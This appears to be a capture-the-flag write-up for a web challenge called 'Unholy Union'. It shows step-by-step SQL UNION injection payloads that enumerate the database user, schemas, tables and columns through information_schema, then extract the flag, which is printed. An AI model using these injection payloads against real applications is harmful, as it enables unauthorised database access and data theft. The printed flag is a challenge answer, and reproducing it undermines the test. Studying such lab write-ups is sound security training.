# Web - Unholy Union

## Description

On the outskirts of a forsaken town lies an abandoned warehouse, rumored to store more than just forgotten relics. Locals speak of an unholy union within its database, where spectral data intertwines with the realm of the living. Whispers tell of a cursed ledger that merges forbidden entries through mysterious queries. Some say that the warehouse's inventory system responds to those who know how to merge the right requests. Can you brave the haunted inventory system and unravel the ghostly union of data before the spirits corrupt the world beyond?

## Homepage

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

The challenge name and the query itself says this can be solved through `SQL Union Injection`

## Attack

### Table description

First we can search with a   to see the table description (a space will match all characters since it's using SQL `LIKE` operator)

```js
{
    "id": 1,
    "name": "Plumbus",
    "description": "A highly useful multi-purpose tool.",
    "origin": "Planet Schlooch",
    "created_at": "2024-10-22T14:12:33.000Z"
  },
```

so it's `int,str,str,str,date`

### User

```sql
ads'union select 1,user(),"","",NULL-- -
```

Result:

```json
[
  {
    "id": 1,
    "name": "user@localhost",
    "description": "",
    "origin": "",
    "created_at": null
  }
]
```

### Databases

```sql
SELECT * FROM inventory WHERE name LIKE '%ads'union select 1,schema_name,"","",NULL from information_schema.schemata-- -%'
```

Result

```json
[
  {
    "id": 1,
    "name": "information_schema",
    "description": "",
    "origin": "",
    "created_at": null
  },
  {
    "id": 1,
    "name": "halloween_invetory",
    "description": "",
    "origin": "",
    "created_at": null
  },
  {
    "id": 1,
    "name": "test",
    "description": "",
    "origin": "",
    "created_at": null
  }
]
```

Our interest lies in `halloween_invetory` database

### Tables

```sql
aaa'union select 1,table_schema,table_name,NULL,NULL from information_schema.tables where table_schema="halloween_invetory"-- -
```

Result:

```json
[
  {
    "id": 1,
    "name": "halloween_invetory",
    "description": "flag",
    "origin": null,
    "created_at": null
  },
  {
    "id": 1,
    "name": "halloween_invetory",
    "description": "inventory",
    "origin": null,
    "created_at": null
  }
]
```

So there are **2 tables, flag and inventory**

Let's get our flag....

### Column

```sql
SELECT * FROM inventory WHERE name LIKE '%aaa'union select 1, NULL,table_name,column_name,NULL from information_schema.columns where table_name="flag"-- -%'
```

Result:

```json
[
  {
    "id": 1,
    "name": null,
    "description": "flag", //table name
    "origin": "flag", //column name
    "created_at": null
  }
]
```

We have 1 column named flag......

### Flag

```sql
SELECT * FROM inventory WHERE name LIKE '%aaa'union select \
1, flag, NULL, NULL, NULL from halloween_invetory.flag-- -%'
-- so halloween_invetory.flag is database.table (we usually use this way to get 
-- values from other database (if we know db name && table name && column name)
```

```json
[
  {
    "id": 1,
    "name": "HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_9c967dbf96425dc2df3b06135f0d003d}",
    "description": null,
    "origin": null,
    "created_at": null
  }
]
//name here is one of the value in column flag 
```

`HTB{uN10n_1nj3ct10n_4r3_345y_t0_l34rn_r1gh17?_9c967dbf96425dc2df3b06135f0d003d}`\


\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_heapbytes' still pwning
